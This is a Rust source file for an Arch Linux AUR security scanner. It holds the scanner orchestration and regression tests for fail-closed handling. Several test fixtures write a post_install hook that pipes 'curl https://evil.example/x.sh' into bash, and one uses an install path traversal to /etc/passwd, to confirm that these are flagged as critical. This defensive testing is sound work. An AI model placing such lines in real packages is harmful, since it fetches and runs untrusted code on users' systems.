//! AUR Security Scanner Core Library
//!
//! Provides security analysis capabilities for Arch Linux AUR packages.
//! Detects malicious patterns in PKGBUILDs and install scripts.

/// Library version
pub const VERSION: &str = env!("CARGO_PKG_VERSION");

pub mod analyzer;
pub mod aur;
pub mod cache;
pub mod catalog;
pub mod depgraph;
pub mod elf;
pub mod error;
pub mod history;
pub mod neturl;
pub mod overlay;
pub mod parser;
pub mod pkgfiles;
pub mod provenance;
pub mod registry;
pub mod resolve;
pub mod rules;
pub mod sbom;
pub mod squat;
pub mod textutil;
pub mod threat_intel;
pub mod types;
pub mod validate;

pub use error::{ParseError, Result, ScanError};
pub use pkgfiles::read_text_capped;
pub use types::*;

use analyzer::SecurityAnalyzer;
use parser::PkgbuildParser;
use rules::RuleEngine;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use threat_intel::IocDatabase;
use tracing::{debug, info, warn};

/// Main scanner that orchestrates all security analysis
pub struct Scanner {
    analyzers: Vec<Arc<dyn SecurityAnalyzer>>,
    parser: Box<dyn PkgbuildParser>,
    rule_engine: Arc<RuleEngine>,
    ioc_db: Arc<IocDatabase>,
    config: ScanConfig,
}

impl Scanner {
    /// Create a new scanner with the given configuration
    pub fn new(config: ScanConfig) -> Result<Self> {
        // Built-in rules + the standard rules.d dirs, plus any custom rules
        // directory the config points at (so `rules_path` actually reaches the
        // matching engine, not just the catalog listing).
        let mut engine = RuleEngine::default();
        if let Some(rules_path) = config.rules_path.as_ref() {
            // An explicitly configured rules directory that cannot be loaded is
            // a hard error, like a malformed config: warning and continuing
            // ran the scan WITHOUT the operator's custom rules while they
            // believed those rules were in force.
            engine.load_rules_from_dir(rules_path).map_err(|e| {
                ScanError::Config(format!(
                    "failed to load custom rules from {}: {}",
                    rules_path.display(),
                    e
                ))
            })?;
        }
        let rule_engine = Arc::new(engine);
        let ioc_db = Arc::new(IocDatabase::load());

        let mut analyzers: Vec<Arc<dyn SecurityAnalyzer>> = vec![
            Arc::new(analyzer::PatternAnalyzer::new(rule_engine.clone())),
            Arc::new(analyzer::IocAnalyzer::new(ioc_db.clone())),
            Arc::new(analyzer::DeepAnalyzer::new()),
            Arc::new(analyzer::RemoteExecAnalyzer::new()),
            Arc::new(analyzer::SourceAnalyzer::new()),
            Arc::new(analyzer::ChecksumAnalyzer::new()),
            Arc::new(analyzer::PrivilegeAnalyzer::new()),
            Arc::new(analyzer::MetadataAnalyzer::new()),
            Arc::new(analyzer::SquatAnalyzer::new()),
            Arc::new(analyzer::OwnershipAnalyzer::new()),
            Arc::new(analyzer::BinaryAnalyzer::new()),
        ];

        // Opt-in, networked threat-intel analyzer. Added ONLY when the operator
        // explicitly enabled it AND a provider key is available (config or env).
        // Everything above this point is offline/static.
        if config.enable_threat_intel {
            if let Some(ti) = build_threat_intel_analyzer(&config) {
                analyzers.push(Arc::new(ti));
                info!("threat-intel lookups enabled (opt-in network access)");
            } else {
                warn!(
                    "enable_threat_intel is set but no VirusTotal/URLhaus key was found \
                     (config or env); threat-intel lookups are disabled"
                );
            }
        }

        let parser: Box<dyn PkgbuildParser> = Box::new(parser::StaticParser::new());

        Ok(Self {
            analyzers,
            parser,
            rule_engine,
            ioc_db,
            config,
        })
    }

    /// The minimum severity the operator wants DISPLAYED.
    ///
    /// Display only: `scan_pkgbuild` returns every finding and gates evaluate
    /// all of them. Apply it with [`ScanResult::visible`] at output time.
    pub fn min_severity(&self) -> Severity {
        self.config.min_severity
    }

    /// The IOC database backing this scanner (embedded defaults + overrides).
    pub fn ioc_database(&self) -> Arc<IocDatabase> {
        self.ioc_db.clone()
    }

    /// Create a scanner with **built-in** configuration only (no config file).
    ///
    /// Prefer [`Self::with_system_config`] for user-facing gates (CLI install,
    /// `aur-scan-wrap`, hook already resolves explicitly) so XDG/`/etc` settings
    /// such as threat-intel are honored. This method stays pure for unit tests
    /// and callers that must not touch the filesystem.
    pub fn with_defaults() -> Result<Self> {
        Self::new(ScanConfig::default())
    }

    /// Create a scanner using the same config discovery as the CLI without
    /// `-c` and the pacman hook: first existing path among
    /// `$XDG_CONFIG_HOME/aur-scanner/config.toml` (or `~/.config/...`) and
    /// `/etc/aur-scanner/config.toml`, else built-in defaults.
    ///
    /// A present-but-malformed file is a hard error (fail closed) — the same
    /// contract as [`ScanConfig::resolve`].
    pub fn with_system_config() -> Result<Self> {
        let (config, path) = ScanConfig::resolve(None)?;
        if let Some(p) = &path {
            debug!("loaded scanner config from {}", p.display());
        }
        Self::new(config)
    }

    /// Load rules from a directory
    pub fn load_rules(&mut self, rules_dir: &Path) -> Result<()> {
        Arc::get_mut(&mut self.rule_engine)
            .ok_or_else(|| ScanError::Config("Cannot modify rule engine".into()))?
            .load_rules_from_dir(rules_dir)?;
        Ok(())
    }

    /// Scan a PKGBUILD file.
    ///
    /// `registry` is required and has no default **on purpose**. It selects
    /// between the full analyzer set and a strictly smaller one, and an earlier
    /// version of this API offered a convenient `scan_pkgbuild(path)` that
    /// passed `None` for you. Every new call site took it: seven of the eight
    /// callers in this workspace silently ran the reduced set, including
    /// `install`, the AUR-helper wrapper, and the pacman hook — the three paths
    /// that actually gate an installation. Nothing in the type system or the
    /// test suite noticed, because a reduced scan is not an error, it is just
    /// quieter.
    ///
    /// Naming the choice fixes that: a caller must write [`Registry::None`] to
    /// get the reduced set, which is greppable, reviewable, and impossible to
    /// reach by omission.
    pub async fn scan_pkgbuild(&self, path: &Path, registry: Registry) -> Result<ScanResult> {
        let registry = registry.into_context();
        let start = std::time::Instant::now();
        info!("Scanning PKGBUILD: {}", path.display());

        // Read and parse PKGBUILD. Cap the read: a real PKGBUILD is a few KB,
        // so a multi-megabyte one is itself abnormal and a memory-DoS risk from
        // a hostile repo. Refuse rather than load it all.
        let content = read_text_capped(path)?;
        let pkgbuild = self.parser.parse(&content)?;

        debug!(
            "Parsed package: {} version {}-{}",
            pkgbuild.pkgname.first().unwrap_or(&"unknown".to_string()),
            pkgbuild.pkgver,
            pkgbuild.pkgrel
        );

        // Everything makepkg runs or installs from beside the PKGBUILD: every
        // install= scriptlet (global and per split package), ALPM hooks, local
        // source=() entries (patches, sidecar scripts, resolved the way makepkg
        // names them) and script-like files nobody declared. Read lossily and
        // capped, never following symlinks; anything that cannot be fully
        // analyzed comes back as a Critical SCAN-001 finding rather than being
        // dropped (a non-UTF-8 byte or padding past the cap used to make a
        // `curl | bash` scriptlet scan clean).
        let dir = match path.parent() {
            Some(p) if !p.as_os_str().is_empty() => p,
            _ => Path::new("."),
        };
        let pkg_files = pkgfiles::collect(dir, &pkgbuild);
        let unanalyzed = pkg_files.findings;
        let install_script = pkg_files.install;
        let side_scripts = pkg_files.side;
        // Prebuilt executables committed into the package directory. Read as
        // bytes, parsed as structure, never executed.
        let local_binaries = discover_local_binaries(dir);
        // Record EVERY file that was actually read, not just the PKGBUILD and
        // the .install. A SARIF consumer reads `scanned_files` as the manifest
        // of what was examined; omitting the .hook files, the side scripts
        // pulled in from source=(), and the committed binaries meant a finding
        // could point at a file the same report said was never scanned.
        let scanned_side: Vec<PathBuf> = side_scripts.iter().map(|s| s.path.clone()).collect();
        let scanned_binaries: Vec<PathBuf> =
            local_binaries.iter().map(|b| b.path.clone()).collect();
        let scanned_install = install_script.as_ref().map(|s| s.path.clone());

        // Create analysis context
        let context = AnalysisContext {
            pkgbuild: pkgbuild.clone(),
            install_script,
            side_scripts,
            local_binaries,
            config: self.config.clone(),
            file_path: path.to_path_buf(),
            registry,
        };

        // Run all analyzers
        let mut findings = unanalyzed;
        for analyzer in &self.analyzers {
            match analyzer.analyze(&context).await {
                Ok(analyzer_findings) => {
                    debug!(
                        "Analyzer {} found {} issues",
                        analyzer.name(),
                        analyzer_findings.len()
                    );
                    findings.extend(analyzer_findings);
                }
                Err(e) => {
                    // Fail closed. Dropping an erroring analyzer's findings and
                    // carrying on reported a partial scan as a clean one.
                    return Err(ScanError::Rule(format!(
                        "analyzer {} failed: {e}; refusing to report an incomplete scan",
                        analyzer.name()
                    )));
                }
            }
        }

        // NOTE: no severity filtering here. `min_severity` is a DISPLAY
        // setting (see `ScanResult::visible`); every gate must see every
        // finding, or a user-writable config could switch High gates off.

        // Sort by severity (critical first)
        findings.sort_by_key(|f| f.severity);

        let duration = start.elapsed();
        info!(
            "Scan complete: {} findings in {:?}",
            findings.len(),
            duration
        );

        let mut scanned_files = vec![path.to_path_buf()];
        if let Some(install_path) = scanned_install {
            scanned_files.push(install_path);
        }
        scanned_files.extend(scanned_side);
        scanned_files.extend(scanned_binaries);
        scanned_files.dedup();

        Ok(ScanResult {
            package_name: pkgbuild.pkgname.first().cloned().unwrap_or_default(),
            package_version: format!("{}-{}", pkgbuild.pkgver, pkgbuild.pkgrel),
            findings,
            scanned_files,
            timestamp: chrono::Utc::now(),
            scan_duration_ms: duration.as_millis() as u64,
        })
    }

    /// Scan a directory containing a PKGBUILD.
    ///
    /// `registry` is required for the same reason as on [`Self::scan_pkgbuild`].
    pub async fn scan_directory(&self, dir: &Path, registry: Registry) -> Result<ScanResult> {
        let pkgbuild_path = dir.join("PKGBUILD");
        if !pkgbuild_path.exists() {
            return Err(ScanError::Io(std::io::Error::new(
                std::io::ErrorKind::NotFound,
                format!("PKGBUILD not found in {}", dir.display()),
            )));
        }
        self.scan_pkgbuild(&pkgbuild_path, registry).await
    }
}

/// Whether a scan is performed with knowledge of what the package registry says.
///
/// Deliberately not an `Option<RegistryContext>`. This is the switch between the
/// full analyzer set and a strictly reduced one, and an `Option` makes the
/// reduced path the ergonomic default that every new call site falls into by
/// accident — which is exactly what happened: seven of eight callers passed
/// `None` without anyone choosing to.
#[derive(Debug, Clone)]
pub enum Registry {
    /// The caller looked the package up and is supplying what it found.
    ///
    /// Enables the ownership analyzer (`OWN-*`), name-impersonation analysis
    /// (`SQUAT-*`), and the operator's `[[owned_namespaces]]` declarations.
    From(RegistryContext),

    /// No registry lookup was performed, and the scan is knowingly reduced.
    ///
    /// `OWN-*` and `SQUAT-*` emit **nothing** on this path — not "no findings",
    /// but "not evaluated". Correct for a bare `scan <path>`, for `diff` (which
    /// compares two directories with no package identity), and for the pacman
    /// hook (offline by design). Wrong anywhere the package name was resolved
    /// through the AUR, because there the information was already in hand.
    None,
}

impl Registry {
    fn into_context(self) -> Option<RegistryContext> {
        match self {
            Registry::From(ctx) => Some(ctx),
            Registry::None => None,
        }
    }
}

/// Resolve a key from an explicit config value first, then a list of
/// environment variables, returning the first non-empty match. Lets keys stay
/// out of config files (`VT_API_KEY` etc.) without hard-coding precedence at
/// each call site.
fn resolve_key(configured: Option<&String>, env_vars: &[&str]) -> Option<String> {
    configured
        .map(|s| s.to_string())
        .or_else(|| env_vars.iter().find_map(|v| std::env::var(v).ok()))
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
}

/// Construct the opt-in threat-intel analyzer from config + environment.
///
/// VirusTotal is enabled by a key alone; URLhaus additionally requires
/// `urlhaus_enabled` (its `Auth-Key` is now mandatory). The verdict cache is
/// built from [`CacheConfig`] when caching is on; if the (hardened, owner-only)
/// cache dir cannot be created, we log and proceed without a cache rather than
/// fail the scan. Returns `None` if no provider ends up usable.
fn build_threat_intel_analyzer(config: &ScanConfig) -> Option<analyzer::ThreatIntelAnalyzer> {
    let ti = &config.threat_intel;
    let vt_key = resolve_key(
        ti.virustotal_api_key.as_ref(),
        &["VT_API_KEY", "VIRUSTOTAL_API_KEY"],
    );
    let urlhaus_key = if ti.urlhaus_enabled {
        resolve_key(ti.urlhaus_auth_key.as_ref(), &["URLHAUS_AUTH_KEY"])
    } else {
        None
    };

    let cache = if config.cache.enabled {
        match cache::DiskCache::new(config.cache.directory.clone(), config.cache.max_size_mb) {
            Ok(c) => Some(Arc::new(c)),
            Err(e) => {
                warn!("threat-intel cache disabled (cannot use cache dir): {e}");
                None
            }
        }
    } else {
        None
    };
    let ttl = std::time::Duration::from_secs(ti.cache_duration_hours.saturating_mul(3600));

    analyzer::ThreatIntelAnalyzer::new(vt_key, urlhaus_key, cache, ttl)
}

/// How much of a binary to read. The ELF header, section header table and
/// string tables all live near the front, so a bounded prefix answers every
/// question this scanner asks -- and a package may ship a legitimately huge
/// artifact that must not be loaded whole.
const MAX_BINARY_HEAD_BYTES: usize = 4 * 1024 * 1024;

/// Find prebuilt executables committed into the package directory.
///
/// Deliberately scoped to the directory itself, not to downloaded sources: a
/// `-bin` package fetching a prebuilt tarball is doing its job, whereas an
/// executable committed into the AUR repository is an artifact in a place meant
/// for a build recipe. That is the shape reported in issue #29.
///
/// Files are identified by magic bytes rather than by extension, so renaming a
/// payload to `.png` does not hide it. Nothing is executed.
fn discover_local_binaries(dir: &Path) -> Vec<BinaryArtifact> {
    use std::io::Read;
    let mut out = Vec::new();
    let Ok(entries) = std::fs::read_dir(dir) else {
        return out;
    };
    let mut paths: Vec<PathBuf> = entries
        .flatten()
        .map(|e| e.path())
        .filter(|p| p.is_file())
        .collect();
    paths.sort();

    for path in paths {
        let Ok(meta) = std::fs::metadata(&path) else {
            continue;
        };
        let Ok(mut f) = std::fs::File::open(&path) else {
            continue;
        };
        let mut head = Vec::new();
        // Bounded read: never the whole file.
        if f.by_ref()
            .take(MAX_BINARY_HEAD_BYTES as u64)
            .read_to_end(&mut head)
            .is_err()
        {
            continue;
        }
        let Some(format) = elf::executable_format(&head) else {
            continue;
        };
        // A shebang script is text and is already covered by the script
        // analyzers; only compiled artifacts belong here.
        if format == "script (shebang)" {
            continue;
        }
        debug!("found prebuilt {format} artifact: {}", path.display());
        out.push(BinaryArtifact {
            path,
            format,
            size: meta.len(),
            head,
        });
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_scanner_creation() {
        let scanner = Scanner::with_defaults();
        assert!(scanner.is_ok());
    }

    #[test]
    fn with_system_config_matches_resolve() {
        // Same discovery path as ScanConfig::resolve(None): built-in defaults
        // when no file exists, hard error only when a present file is bad.
        let a = Scanner::with_system_config();
        let b = ScanConfig::resolve(None).and_then(|(c, _)| Scanner::new(c));
        assert_eq!(a.is_ok(), b.is_ok());
    }

    // ---- fail-open regressions (audit 2026-10) -------------------------------

    const EVIL: &str = "post_install() { curl -s https://evil.example/x.sh | bash; }\n";

    fn write_pkg(dir: &Path, pkgbuild_extra: &str) {
        std::fs::write(
            dir.join("PKGBUILD"),
            format!(
                "pkgname=demo\npkgver=1\npkgrel=1\narch=('any')\n{pkgbuild_extra}\npackage() {{ :; }}\n"
            ),
        )
        .unwrap();
    }

    fn parse_dir(dir: &Path) -> parser::ParsedPkgbuild {
        parser::PkgbuildParser::parse(
            &parser::StaticParser::new(),
            &std::fs::read_to_string(dir.join("PKGBUILD")).unwrap(),
        )
        .unwrap()
    }

    async fn scan(dir: &Path) -> ScanResult {
        Scanner::with_defaults()
            .unwrap()
            .scan_directory(dir, Registry::None)
            .await
            .unwrap()
    }

    fn has_critical(r: &ScanResult) -> bool {
        r.findings.iter().any(|f| f.severity == Severity::Critical)
    }

    fn scanned_names(r: &ScanResult) -> Vec<String> {
        r.scanned_files
            .iter()
            .filter_map(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
            .collect()
    }

    #[tokio::test]
    async fn install_script_baseline_is_critical() {
        let d = tempfile::tempdir().unwrap();
        write_pkg(d.path(), "install=demo.install");
        std::fs::write(d.path().join("demo.install"), EVIL).unwrap();
        assert!(has_critical(&scan(d.path()).await));
    }

    #[tokio::test]
    async fn non_utf8_byte_does_not_hide_install_script() {
        let d = tempfile::tempdir().unwrap();
        write_pkg(d.path(), "install=demo.install");
        let mut bytes = b"# \xff\n".to_vec();
        bytes.extend_from_slice(EVIL.as_bytes());
        std::fs::write(d.path().join("demo.install"), bytes).unwrap();
        let r = scan(d.path()).await;
        assert!(
            has_critical(&r),
            "got {:?}",
            r.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[tokio::test]
    async fn non_utf8_byte_does_not_hide_hook_file() {
        let d = tempfile::tempdir().unwrap();
        write_pkg(d.path(), "");
        let mut bytes = b"# \xff\n".to_vec();
        bytes.extend_from_slice(EVIL.as_bytes());
        std::fs::write(d.path().join("x.hook"), bytes).unwrap();
        assert!(has_critical(&scan(d.path()).await));
    }

    #[tokio::test]
    async fn non_utf8_byte_does_not_hide_local_source() {
        let d = tempfile::tempdir().unwrap();
        write_pkg(d.path(), "source=('helper.sh')");
        let mut bytes = b"#!/bin/sh\n# \xff\n".to_vec();
        bytes.extend_from_slice(b"curl -s https://evil.example/x.sh | bash\n");
        std::fs::write(d.path().join("helper.sh"), bytes).unwrap();
        let r = scan(d.path()).await;
        assert!(scanned_names(&r).contains(&"helper.sh".to_string()));
        assert!(has_critical(&r));
    }

    #[tokio::test]
    async fn oversized_install_script_is_unanalyzable_critical() {
        let d = tempfile::tempdir().unwrap();
        write_pkg(d.path(), "install=demo.install");
        let mut body = EVIL.as_bytes().to_vec();
        body.resize(pkgfiles::MAX_SCAN_FILE_BYTES as usize + 10, b'#');
        std::fs::write(d.path().join("demo.install"), body).unwrap();
        let r = scan(d.path()).await;
        assert!(
            r.has_unanalyzable(),
            "padding past the cap must be SCAN-001"
        );
        // The capped prefix is still scanned, so the payload is also reported.
        assert!(r.findings.iter().any(|f| f.id != UNANALYZABLE_CODE));
    }

    #[tokio::test]
    async fn oversized_local_source_and_hook_are_unanalyzable() {
        let d = tempfile::tempdir().unwrap();
        write_pkg(d.path(), "source=('helper.sh')");
        let big = vec![b'#'; pkgfiles::MAX_SCAN_FILE_BYTES as usize + 1];
        std::fs::write(d.path().join("helper.sh"), &big).unwrap();
        std::fs::write(d.path().join("a.hook"), &big).unwrap();
        let r = scan(d.path()).await;
        let n = r
            .findings
            .iter()
            .filter(|f| f.id == UNANALYZABLE_CODE)
            .count();
        assert_eq!(n, 2, "one SCAN-001 per oversized file");
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn symlinked_declared_install_is_unanalyzable_and_never_read() {
        let d = tempfile::tempdir().unwrap();
        write_pkg(d.path(), "install=demo.install");
        let target = d.path().join("elsewhere.txt");
        std::fs::write(&target, "TOPSECRET-CONTENT\n").unwrap();
        // Point at a file outside the package dir.
        let outside = tempfile::tempdir().unwrap();
        let secret = outside.path().join("hostname");
        std::fs::write(&secret, "TOPSECRET-CONTENT\n").unwrap();
        std::os::unix::fs::symlink(&secret, d.path().join("demo.install")).unwrap();
        let r = scan(d.path()).await;
        let f = r
            .findings
            .iter()
            .find(|f| f.id == UNANALYZABLE_CODE)
            .expect("symlink must be SCAN-001");
        assert!(
            f.description.contains(secret.to_str().unwrap()),
            "target is named"
        );
        let json = serde_json::to_string(&r).unwrap();
        assert!(
            !json.contains("TOPSECRET-CONTENT"),
            "link contents must not leak into findings"
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn symlink_to_dev_zero_and_fifo_do_not_hang_or_pass_clean() {
        let d = tempfile::tempdir().unwrap();
        write_pkg(d.path(), "");
        std::os::unix::fs::symlink("/dev/zero", d.path().join("zero.install")).unwrap();
        let fifo = d.path().join("x.install");
        let made = std::process::Command::new("mkfifo")
            .arg(&fifo)
            .status()
            .map(|s| s.success())
            .unwrap_or(false);
        let r = tokio::time::timeout(std::time::Duration::from_secs(20), scan(d.path()))
            .await
            .expect("scan must not hang on a FIFO");
        let n = r
            .findings
            .iter()
            .filter(|f| f.id == UNANALYZABLE_CODE)
            .count();
        assert_eq!(n, if made { 2 } else { 1 });
    }

    #[tokio::test]
    async fn split_package_install_in_function_is_scanned() {
        let d = tempfile::tempdir().unwrap();
        std::fs::write(
            d.path().join("PKGBUILD"),
            "pkgbase=demo\npkgname=(demo demo-extra)\npkgver=1\npkgrel=1\narch=('any')\ninstall=demo.install\n\
             package_demo() { :; }\npackage_demo-extra() {\n  install=extra.install\n}\n",
        )
        .unwrap();
        std::fs::write(d.path().join("demo.install"), EVIL).unwrap();
        std::fs::write(
            d.path().join("extra.install"),
            "post_install() { echo hi; }\n",
        )
        .unwrap();
        let pkg = parse_dir(d.path());
        assert!(pkg.installs.contains(&"demo.install".to_string()));
        assert!(pkg.installs.contains(&"extra.install".to_string()));
        let r = scan(d.path()).await;
        assert!(
            has_critical(&r),
            "main package's install must still be scanned"
        );
        let names = scanned_names(&r);
        assert!(
            names.contains(&"demo.install".to_string())
                && names.contains(&"extra.install".to_string()),
            "{names:?}"
        );
    }

    #[tokio::test]
    async fn variable_and_subdir_local_sources_are_read() {
        let d = tempfile::tempdir().unwrap();
        write_pkg(
            d.path(),
            "_h=helper\nsource=(\"${pkgname}-helper.sh\" \"scripts/other.sh\" \"${_h}2.sh\")",
        );
        std::fs::write(d.path().join("demo-helper.sh"), EVIL).unwrap();
        std::fs::write(d.path().join("other.sh"), "echo other\n").unwrap();
        std::fs::write(d.path().join("helper2.sh"), "echo two\n").unwrap();
        let r = scan(d.path()).await;
        let names = scanned_names(&r);
        for want in ["demo-helper.sh", "other.sh", "helper2.sh"] {
            assert!(names.contains(&want.to_string()), "{want}: {names:?}");
        }
        assert!(has_critical(&r));
    }

    #[test]
    fn rename_and_unresolved_source_names_are_resolved() {
        let d = tempfile::tempdir().unwrap();
        write_pkg(
            d.path(),
            "source=(\"fix.sh::local-fix.sh\" \"v${pkgver//./_}.patch\")",
        );
        std::fs::write(d.path().join("fix.sh"), "echo fix\n").unwrap();
        std::fs::write(d.path().join("v1.patch"), "+echo patch\n").unwrap();
        let files = pkgfiles::collect(d.path(), &parse_dir(d.path()));
        let names: Vec<_> = files
            .side
            .iter()
            .filter_map(|s| s.path.file_name().map(|n| n.to_string_lossy().into_owned()))
            .collect();
        assert!(names.contains(&"fix.sh".to_string()), "{names:?}");
        assert!(names.contains(&"v1.patch".to_string()), "{names:?}");
    }

    #[test]
    fn undeclared_script_files_are_scanned_and_labelled_as_source() {
        let d = tempfile::tempdir().unwrap();
        write_pkg(d.path(), "");
        std::fs::write(d.path().join("run"), "#!/bin/sh\necho hi\n").unwrap();
        std::fs::write(d.path().join("notes.txt"), "plain\n").unwrap();
        let files = pkgfiles::collect(d.path(), &parse_dir(d.path()));
        assert_eq!(files.side.len(), 1);
        assert_eq!(files.side[0].file_type, FileType::SourceFile);
    }

    #[test]
    fn local_source_path_traversal_is_not_read() {
        let d = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        std::fs::write(outside.path().join("secret.sh"), "SECRET\n").unwrap();
        write_pkg(
            d.path(),
            &format!(
                "source=('{}/secret.sh' '../secret.sh')",
                outside.path().display()
            ),
        );
        let files = pkgfiles::collect(d.path(), &parse_dir(d.path()));
        assert!(files.side.iter().all(|s| !s.content.contains("SECRET")));
    }

    #[test]
    fn install_traversal_is_unanalyzable_not_silent() {
        let d = tempfile::tempdir().unwrap();
        write_pkg(d.path(), "install=../../../../etc/passwd");
        let files = pkgfiles::collect(d.path(), &parse_dir(d.path()));
        assert!(files.install.is_none());
        assert!(files.findings.iter().any(|f| f.id == UNANALYZABLE_CODE));
    }

    #[tokio::test]
    async fn min_severity_does_not_hide_findings_from_gates() {
        let d = tempfile::tempdir().unwrap();
        write_pkg(
            d.path(),
            "install=demo.install\nsource=('https://example.com/a.tar.gz')",
        );
        std::fs::write(d.path().join("demo.install"), EVIL).unwrap();
        let cfg = ScanConfig {
            min_severity: Severity::Critical,
            ..Default::default()
        };
        let r = Scanner::new(cfg)
            .unwrap()
            .scan_directory(d.path(), Registry::None)
            .await
            .unwrap();
        // Everything is kept; only `visible` narrows what is shown.
        assert!(r.findings.iter().any(|f| f.severity != Severity::Critical));
        assert!(r
            .visible(Severity::Critical)
            .findings
            .iter()
            .all(|f| f.severity == Severity::Critical));
    }

    #[test]
    fn explicit_rules_path_failure_is_a_hard_error() {
        let cfg = ScanConfig {
            rules_path: Some(PathBuf::from("/nonexistent/aur-scan-rules-dir")),
            ..Default::default()
        };
        assert!(matches!(Scanner::new(cfg), Err(ScanError::Config(_))));
    }

    #[tokio::test]
    async fn analyzer_error_fails_closed() {
        struct Boom;
        #[async_trait::async_trait]
        impl SecurityAnalyzer for Boom {
            fn name(&self) -> &str {
                "boom"
            }
            async fn analyze(&self, _: &AnalysisContext) -> Result<Vec<Finding>> {
                Err(ScanError::Network("down".into()))
            }
        }
        let d = tempfile::tempdir().unwrap();
        write_pkg(d.path(), "");
        let mut scanner = Scanner::with_defaults().unwrap();
        scanner.analyzers.push(Arc::new(Boom));
        let r = scanner.scan_directory(d.path(), Registry::None).await;
        assert!(
            r.is_err(),
            "an analyzer error must not yield a clean result"
        );
    }

    #[tokio::test]
    async fn test_scan_detects_install_hook_with_var_filename() {
        // Regression: install="${pkgname}.install" must still resolve so the
        // install-hook rules actually run.
        let scanner = Scanner::with_defaults().unwrap();
        let fixture = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../../tests/fixtures/malicious/atomic-arch");
        if !fixture.join("PKGBUILD").exists() {
            return; // fixture not present in this checkout
        }
        let result = scanner
            .scan_directory(&fixture, Registry::None)
            .await
            .unwrap();
        assert!(
            result.findings.iter().any(|f| f.id == "ATOMIC-001"),
            "expected ATOMIC-001 from the install hook; got: {:?}",
            result.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
        assert!(result
            .scanned_files
            .iter()
            .any(|p| { p.extension().and_then(|e| e.to_str()) == Some("install") }));
    }
}
